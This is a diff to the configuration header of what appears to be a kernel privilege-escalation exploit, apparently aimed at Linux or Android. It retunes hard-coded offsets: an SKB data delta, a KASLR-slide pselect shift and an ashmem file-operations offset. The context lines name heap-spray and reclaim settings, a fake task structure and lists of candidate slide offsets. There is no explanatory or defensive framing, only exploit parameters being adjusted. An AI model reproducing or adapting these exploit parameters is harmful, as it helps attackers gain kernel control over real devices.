@@ -59,7 +59,7 @@
 // ============================================================================
 // SKB DATA DELTA
 // ============================================================================
-#define SKB_DATA_DELTA (-0xe80LL)
+#define SKB_DATA_DELTA (-0xe70LL)
 
 // ============================================================================
 // RECLAIM / HEAP SPRAY CONFIGS
@@ -89,7 +89,7 @@
 #define SLIDE_USE_FAKE_TASK 1
 #define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000def04ULL
-#define SLIDE_PSELECT_WORD_SHIFT 0
+#define SLIDE_PSELECT_WORD_SHIFT 3
 #define SLIDE_P0_OFFSET_CANDIDATES  \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL,  \
   0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL,  \
@@ -170,7 +170,7 @@
 #define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01598a0aULL
 #define NFULNL_LOGGERS_OFF 0x021129a8ULL
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02245468ULL
-#define ASHMEM_MISC_FOPS_OFF 0x0228a218ULL
+#define ASHMEM_MISC_FOPS_OFF 0x01265098ULL
 
 // ============================================================================
 // COMPUTED ABSOLUTE ADDRESSES
